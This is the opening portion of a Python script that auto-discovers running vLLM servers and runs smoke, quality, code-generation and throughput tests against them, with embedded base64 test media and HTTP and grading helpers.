#!/usr/bin/env python3
# Christopher Gray - @c2theg/ai  |  Version: 1.4.0  |  Update: 10/3/2026
# vLLM smoke test — auto-discovers every running vLLM instance (ports + models)
#                   and runs the full smoke test against each one.
# Includes 21 auto-graded model-quality tests (reasoning, math, summarization,
# counting, PDF extraction, table lookup, multi-turn, negation, unit conversion,
# date math, JSON extraction, code bug-fixing, instruction-following, code,
# factual, long-context, translation, sentiment, vision/OCR, audio/ASR) plus a
# 7-language timed code-generation suite with model self-graded correctness,
# the 26-question workload suite from tester_llamacpp.py (finance, security,
# code, GPS, F5, meeting transcripts, glossary, research, home automation —
# streamed, with TTFT and decode speed), and a per-instance capability
# scorecard. Every run reports each model's context size, tokens/s Min/Max/Avg
# across ALL answers, total duration, and suggestions for tuning the next run.
#
#
# Update Yourself:
#  curl -fsSL -H 'Cache-Control: no-cache' -H 'Pragma: no-cache' -o 'tester_vllm.sh' "https://raw.githubusercontent.com/c2theg/ai/refs/heads/main/tester_vllm.sh?nocache=$(date +%s)" && chmod u+x tester_vllm.sh
#
#
# Usage: ./tester_vllm.py [HOST] [PORT] [options]
#   No args     -> auto-discover ALL local vLLM instances and test each —
#                  bare-metal `vllm serve` processes AND Docker/Podman
#                  containers (published ports resolved via `docker inspect`).
#   HOST        -> discover instances on that host (local discovery only).
#   HOST PORT   -> test only that specific host:port (skips discovery).
#
# Options (workload suite, ported from tester_llamacpp.py):
#   --thinking on|off      send enable_thinking to the chat template (default: model default)
#   --max-tokens N         budget per workload question (default 8192)
#   --only A,B             run only workload questions whose name contains A or B (e.g. f5,gps)
#   --no-workloads         skip the workload suite (original tests 1-37 only)
#   --list                 print the workload question names and exit
#   --long-prompt [T]      add a ~T-token prompt (default 2000) to measure real prefill speed
#   --context-test         fill ~90% of the reported context with a hidden code near the start
#                          and check it is both accepted and recalled (--context-test-fraction F)
#   --concurrency N        send workload questions N at a time (vLLM batching / contention)
#   --no-cache             cache_prompt=false (llama.cpp only)
#   --full-responses       don't truncate long workload answers
#   --api-key KEY          for servers started with --api-key (or set $VLLM_API_KEY)
#
# Requirements:
#   - python3 (>=3.8), pip install rich   (required)
#   - pdftotext (poppler-utils)           (optional — enables the PDF
#                                           extraction test; skips gracefully
#                                           if it's absent)
#   - nvidia-smi / rocm-smi               (optional — enables GPU stats)
#   - docker / podman                     (optional — enables discovery of
#                                           containerized vLLM; run as root or
#                                           a docker-group user)
#
# Hugging Face setup (only needed if the vLLM instance under test is serving a
# gated/private model, e.g. Llama or Gemma — public models need no token):
#   1. Grab a read token from https://huggingface.co/settings/tokens
#   2. Create a .env file next to wherever you launch `vllm serve`, containing:
#        HUGGING_FACE_HUB_TOKEN=hf_xxxxxxxxxxxxxxxxxxxxxxxxxxxx
#   3. Before starting vLLM, load it into the environment:
#        set -a && source .env && set +a
#   This token is consumed by vLLM itself when it downloads the model from the
#   Hub — this tester script only talks HTTP to an already-running instance
#   and never touches Hugging Face directly, so it has nothing to load here.

from __future__ import annotations

import argparse
import base64
import calendar
import json
import os
import random
import re
import shutil
import string
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from typing import Optional

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import (
        Progress,
        BarColumn,
        TextColumn,
        TimeElapsedColumn,
        MofNCompleteColumn,
    )
    from rich.syntax import Syntax
    from rich.table import Table
    from rich.rule import Rule
    from rich import box
except ImportError:
    sys.stderr.write(
        "This script requires the 'rich' package.\n"
        "Install it with:\n"
        "  pip3 install rich\n"
    )
    sys.exit(1)

SCRIPT_AUTHOR = "Christopher Gray - @c2theg/ai"
SCRIPT_VERSION = "1.4.0"
SCRIPT_UPDATED = "10/3/2026"

TOTAL_TEST_STEPS = 40  # 1,2,3,3b,4,5,5b,6,7,7b,8,9 (12) + 10-30 (21) + 31-37 (7)

console = Console(highlight=False)

# A distinct color rotates through instances so multiple models being tested
# in one run are visually easy to tell apart at a glance.
INSTANCE_COLORS = ["cyan", "magenta", "green", "yellow", "blue", "bright_red"]

# ── Embedded test media (self-contained; no external files or network) ────────
# 1-bit PNG containing the literal text "VLLM-OCR-7392"  (for the vision/OCR test)
OCR_PNG_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAWgAAABaAQAAAAC9W/FqAAACU0lEQVR42u3WQW7bRhjF8d+MBi135tILAyFyjqBiexIfoSeIJ0XXPYNOEtBFDpBeoKABL7wrUxQF0445XcixLEVJkHVFgAAJvvn48b3/N2CovuKITuqT+qQ+qf/v6qQ2iZusBjctblruk3ch4DokPxF5RfTSclBh8ye39xk9qFf5vuaa+20nzZ645pptbDCCxaYYFm8P+s4jFgbZhAkU02wsiNZKu7ekMFZm25OZyTSbj3kyfztOy2pmXUByMXvBxVEHp/PzuaRvCrGwLqbn/DB7XkRdnrsPwuFX6BLnAcHWg96YTd8f1N56M/axzB59Le3F48JjWeZA55cPn9GtMrSI2mHqj6X84+5yaShn+aB2Gn/GwPKkwNQrn6EqkB9Stc3zroWaRM045k8g90+CbOxcsXye2OsGrtF3rz/uJP6xz9cjbhtvKI0oTdefrN4+1JtazO0XZucSmRdzswUy7ruxT2PIjwMWGDtR3F9xvbtbVzehJkJZRYZeZN4Z+PeDyxkbcn4Kfc7H+u6J7eCWfng6gIEoSDueut3Tl3QjS+MdpCUS+fcjBiujSLudy7e8z0o6zLKwXrphSY2KxrMKV+4qDZF8EKCxcLcgbae4kwzmluTp5tMvv9He3TWp/JV2eb7W/t64SWXbyX2IXoUHppv3XRvv22Y7xYX2TeO2nbYU9PsBSnSBlrAc4BWPbru9rHtCYrt180DdZYQcsks9rh5edpk+bKB1XFfCyHdn43JWax3Pap1XdVrX4arOz2oNta7qYFXD6a/3pD6pT+qT+iuO/wARid8UZkrVCQAAAABJRU5ErkJggg=="
)
# Short mono MP3 of the spoken phrase "the quick brown fox"  (for the ASR test)
SPEECH_MP3_B64 = (
    "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"
)

PDF_ARTICLE_TEXT = (
    "The town council announced Tuesday that the new public library on Elm Street will open on "
    "November 3rd, marking the completion of an 18 month, 4.2 million dollar renovation. The "
    "project added a childrens reading wing, thirty public computer stations, and a rooftop "
    "garden. Library director Elena Vasquez said the goal is to triple foot traffic within the "
    "first year. Confirmation code: DOC-9931-B."
)


# ─────────────────────────────────────────────────────────────────────────────
# Result bookkeeping (feeds the final roll-up report)
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class InstanceResult:
    base_url: str
    model: str = "(unknown)"
    duration_s: float = 0.0
    failures: int = 0
    quality_pass: int = 0
    quality_total: int = 0
    cap_chat: bool = False
    cap_embed: bool = False
    reachable: bool = True
    context_len: Optional[int] = None
    tps_min: Optional[float] = None
    tps_avg: Optional[float] = None
    tps_max: Optional[float] = None
    workload_ok: int = 0
    workload_checked: int = 0
    suggestions: list = field(default_factory=list)


# ─────────────────────────────────────────────────────────────────────────────
# HTTP helpers
# ─────────────────────────────────────────────────────────────────────────────
# Run-wide request settings, set once from argv in main(). Module-level so every
# HTTP helper (and therefore every test) applies them the same way.
API_KEY: str = os.environ.get("VLLM_API_KEY", "")
THINKING: Optional[bool] = None  # None = don't send chat_template_kwargs at all


def _headers(json_body: bool = False) -> dict:
    h = {"Content-Type": "application/json"} if json_body else {}
    if API_KEY:
        h["Authorization"] = f"Bearer {API_KEY}"
    return h


def _apply_thinking(body: dict) -> dict:
    # vLLM and llama.cpp both pass chat_template_kwargs through to the chat
    # template, which is where Qwen3/GLM/etc. read their thinking switch.
    if THINKING is not None and "messages" in body:
        body.setdefault("chat_template_kwargs", {})["enable_thinking"] = THINKING
    return body


def http_get(url: str, timeout: int = 10) -> Optional[str]:
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers=_headers()), timeout=timeout) as r:
            return r.read().decode("utf-8", "replace")
    except Exception:
        return None


def http_get_status(url: str, timeout: int = 10) -> tuple[Optional[int], str]:
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers=_headers()), timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return None, ""


def http_post_json(url: str, obj: dict, timeout: int = 300) -> Optional[str]:
    data = json.dumps(_apply_thinking(dict(obj))).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=_headers(True), method="POST")
    try:
        start = time.perf_counter()
        with urllib.request.urlopen(req, timeout=timeout) as r:
            text = r.read().decode("utf-8", "replace")
        if url.endswith("completions"):
            THROUGHPUT.record_response(CURRENT_LABEL, text, time.perf_counter() - start)
        return text
    except Exception:
        # Mirrors bash's `curl -sf` — fail silently on any error (connection,
        # timeout, or non-2xx status) and let the caller treat it as "no response".
        return None


def http_post_multipart_audio(url: str, file_bytes: bytes, model: str, timeout: int = 300) -> Optional[str]:
    boundary = "----vllmtester" + "".join(random.choices(string.ascii_letters + string.digits, k=16))
    parts = [
        f'--{boundary}\r\nContent-Disposition: form-data; name="model"\r\n\r\n{model}\r\n'.encode(),
        f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="test.mp3"\r\n'
        f'Content-Type: audio/mpeg\r\n\r\n'.encode(),
        file_bytes,
        f'\r\n--{boundary}--\r\n'.encode(),
    ]
    body = b"".join(parts)
    req = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={
            **_headers(),
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "replace")
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Small print helpers (styled like the previous bash [PASS]/[FAIL]/[WARN]/[INFO])
# ─────────────────────────────────────────────────────────────────────────────
def cpass(msg: str) -> None:
    console.print(f"[bold green][PASS][/bold green] {msg}")


def cfail(msg: str) -> None:
    console.print(f"[bold red][FAIL][/bold red] {msg}")


def cwarn(msg: str) -> None:
    console.print(f"[bold yellow][WARN][/bold yellow] {msg}")


def cinfo(msg: str) -> None:
    console.print(f"[bold cyan][INFO][/bold cyan] {msg}")


def section(title: str, color: str = "cyan") -> None:
    global CURRENT_LABEL
    CURRENT_LABEL = title
    console.print()
    console.print(Rule(f"[bold {color}]{title}[/bold {color}]", style=color, align="left"))


# ─────────────────────────────────────────────────────────────────────────────
# Throughput bookkeeping — every chat/completions answer, from every test, is
# recorded here so the run can report tokens/s Min/Max/Avg across all of them.
# ─────────────────────────────────────────────────────────────────────────────
# Answers shorter than this are excluded from tokens/s stats: a 2-token
# "Alice" reply is all request overhead and would make Min meaningless.
TPS_MIN_TOKENS = 16

CURRENT_LABEL = ""


@dataclass
class TpsSample:
    label: str
    completion_tokens: int
    seconds: float                      # end-to-end request time
    ttft_s: Optional[float] = None      # streamed answers only
    decode_tps: Optional[float] = None  # streamed answers / llama.cpp timings only

    @property
    def tps(self) -> float:
        return self.completion_tokens / self.seconds if self.seconds > 0 else 0.0


class ThroughputTracker:
    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.samples: list[TpsSample] = []
        self.truncated: list[str] = []       # finish_reason == "length"
        self.reasoning_only: list[str] = []  # thinking used the whole budget, no answer

    def reset(self) -> None:
        with self.lock:
            self.samples, self.truncated, self.reasoning_only = [], [], []

    def add(self, sample: TpsSample, finish: str = "", content: str = "", reasoning: str = "") -> None:
        with self.lock:
            if sample.completion_tokens:
                self.samples.append(sample)
            if finish == "length":
                self.truncated.append(sample.label)
            if reasoning and not content:
                self.reasoning_only.append(sample.label)

    def record_response(self, label: str, text: str, seconds: float) -> None:
        try:
            data = json.loads(text)
            choice = (data.get("choices") or [{}])[0]
            msg = choice.get("message") or {}
            tokens = (data.get("usage") or {}).get("completion_tokens") or 0
            timings = data.get("timings") or {}
        except Exception:
            return
        self.add(
            TpsSample(label, tokens, seconds, decode_tps=timings.get("predicted_per_second")),
            finish=choice.get("finish_reason") or "",
            content=msg.get("content") or choice.get("text") or "",
            reasoning=msg.get("reasoning_content") or msg.get("reasoning") or "",
        )

    def stats(self) -> Optional[dict]:
        with self.lock:
            usable = [s for s in self.samples if s.completion_tokens >= TPS_MIN_TOKENS and s.seconds > 0]
        if not usable:
            return None
        lo = min(usable, key=lambda s: s.tps)
        hi = max(usable, key=lambda s: s.tps)
        decode = [s.decode_tps for s in usable if s.decode_tps]
        ttft = [s.ttft_s for s in usable if s.ttft_s is not None]
        return {
            "n": len(usable),
            "excluded": len(self.samples) - len(usable),
            "min": lo.tps, "min_label": lo.label,
            "max": hi.tps, "max_label": hi.label,
            "avg": sum(s.tps for s in usable) / len(usable),
            "weighted": sum(s.completion_tokens for s in usable) / sum(s.seconds for s in usable),
            "tokens": sum(s.completion_tokens for s in usable),
            "decode": (min(decode), sum(decode) / len(decode), max(decode)) if decode else None,
            "ttft_avg": sum(ttft) / len(ttft) if ttft else None,
            "first_ttft": ttft[0] if ttft else None,
        }


THROUGHPUT = ThroughputTracker()


def print_throughput_stats(st: Optional[dict], color: str = "cyan") -> None:
    if not st:
        cwarn(f"No answers of >= {TPS_MIN_TOKENS} tokens were recorded — tokens/s not available")
        return
    t = Table(box=box.SIMPLE, show_header=False)
    t.add_column(style="bold")
    t.add_column()
    t.add_row("Answers measured", f"{st['n']} (≥{TPS_MIN_TOKENS} tokens; {st['excluded']} shorter answers excluded)")
    t.add_row("Min tokens/s", f"{st['min']:.1f}  [dim]({st['min_label']})[/dim]")
    t.add_row("Max tokens/s", f"{st['max']:.1f}  [dim]({st['max_label']})[/dim]")
    t.add_row("Avg tokens/s", f"{st['avg']:.1f} per answer  |  {st['weighted']:.1f} overall ({st['tokens']} tokens)")
    if st["decode"]:
        lo, avg, hi = st["decode"]
        t.add_row("Decode-only tokens/s", f"min {lo:.1f} / avg {avg:.1f} / max {hi:.1f}  [dim](streamed answers, excludes prefill)[/dim]")
    if st["ttft_avg"] is not None:
        t.add_row("Avg time to first token", f"{st['ttft_avg']:.2f}s")
    console.print(t)
    console.print(
        "  [dim]tokens/s = completion tokens / end-to-end request time (includes prompt processing and "
        "queueing), so it reads lower than pure decode speed.[/dim]"
    )


# ─────────────────────────────────────────────────────────────────────────────
# Chat / grading helpers
# ─────────────────────────────────────────────────────────────────────────────
def chat_once(base_url: str, model: str, prompt: str, max_tokens: int = 256) -> str:
    body = {
        "model": model,
        "max_tokens": max_tokens,
        "temperature": 0,
        "messages": [{"role": "user", "content": prompt}],
    }
    resp = http_post_json(f"{base_url}/v1/chat/completions", body)
    return extract_message_text(resp)


def extract_message_text(resp: Optional[str]) -> str:
    if not resp:
        return ""
    try:
        data = json.loads(resp)
        msg = data["choices"][0]["message"]
    except Exception:
        return ""
    content = msg.get("content") or ""
    if content:
        return content
    # Reasoning models sometimes only populate reasoning_content / reasoning,
    # leaving content null when the answer budget ran out mid-thought.
    return msg.get("reasoning_content") or msg.get("reasoning") or ""


def grade(label: str, resp: str, pattern: str, quality: "QualityTracker") -> bool:
    quality.total += 1
    if resp and re.search(pattern, resp, re.IGNORECASE):
        cpass(label)
        quality.passed += 1
        return True
    cwarn(f"{label} — expected /{pattern}/")
    if resp:
        console.print(f"     got: {resp.strip().replace(chr(10), ' ')[:160]}")
    return False


def cosine_similarity(a: list[float], b: list[float]) -> float:
    dot = sum(x * y for x, y in zip(a, b))
    na = sum(x * x for x in a) ** 0.5
    nb = sum(y * y for y in b) ** 0.5
    if na == 0 or nb == 0:
        return 0.0
    return dot / (na * nb)


@dataclass
class QualityTracker:
    passed: int = 0
    total: int = 0


# ─────────────────────────────────────────────────────────────────────────────
# Code generation suite helper
# ─────────────────────────────────────────────────────────────────────────────
LEXER_BY_LABEL = {
    "Python3 (basic)": "python",
    "PHP (basic)": "php",
    "Bash / Shell scripting (basic)": "bash",
    "Node.js (basic)": "javascript",
    "MySQL SELECT with JOINs and GROUP BY (advanced)": "sql",
    "MongoDB query (medium)": "javascript",
    "JavaScript (medium)": "javascript",
}

FENCE_RE = re.compile(r"^\s*```")


def code_gen_test(
    base_url: str,
    model: str,
    test_num: str,
    lang_label: str,
    gen_prompt: str,
    quality: QualityTracker,
    color: str,
    max_tokens: int = 2048,
) -> None:
    section(f"{test_num}. Code generation — {lang_label}", color)

    start = time.perf_counter()
    code = chat_once(base_url, model, gen_prompt, max_tokens)
    elapsed_s = time.perf_counter() - start
    cinfo(f"Generation time: {elapsed_s:.2f}s")

    if not code.strip():
        cwarn(f"No code generated for {lang_label} (empty response)")
        return

    clean_lines = [ln for ln in code.splitlines() if not FENCE_RE.match(ln)]
    clean_code = "\n".join(clean_lines).strip("\n")

    lexer = LEXER_BY_LABEL.get(lang_label, "text")
    console.print(f"  [bold]Generated code ({lang_label}):[/bold]")
    console.print(Syntax(clean_code, lexer, theme="monokai", line_numbers=False, word_wrap=True))

    judge_prompt = (
        "Given the provided code, what is the likelihood this code is syntactically correct "
        "and will work? Provide a percentage of its correctness in a 1-100% format, with just "
        f"the number and a percent sign, nothing else.\n\nCode:\n{code}"
    )
    judge_resp = chat_once(base_url, model, judge_prompt, 512)

    score = None
    m = re.findall(r"([0-9]{1,3})\s*%", judge_resp)
    if m:
        score = int(m[-1])
    else:
        m2 = re.findall(r"([0-9]{1,3})", judge_resp)
        if m2:
            score = int(m2[-1])

    quality.total += 1
    if score is not None:
        score = min(score, 100)
        if score >= 70:
            cpass(f"Self-assessed correctness: {score}%")
            quality.passed += 1
        else:
            cwarn(f"Self-assessed correctness: {score}% (below 70% confidence threshold)")
    else:
        cwarn("Could not parse a correctness percentage from the self-assessment")
        if judge_resp:
            console.print(f"     judge raw: {judge_resp.strip().replace(chr(10), ' ')[:160]}")


# ─────────────────────────────────────────────────────────────────────────────
# PDF fixture — built once, at import time, and reused across every instance
# ─────────────────────────────────────────────────────────────────────────────
def build_pdf_and_extract_text() -> str:
    if not shutil.which("pdftotext"):
        return ""
    stream_body = f"BT /F1 10 Tf 40 700 Td ({PDF_ARTICLE_TEXT}) Tj ET\n".encode("latin-1", "replace")
    pdf_parts = [
        b"%PDF-1.4\n",
        b"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n",
        b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n",
        b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R"
        b"/Resources<</Font<</F1 5 0 R>>>>>>endobj\n",
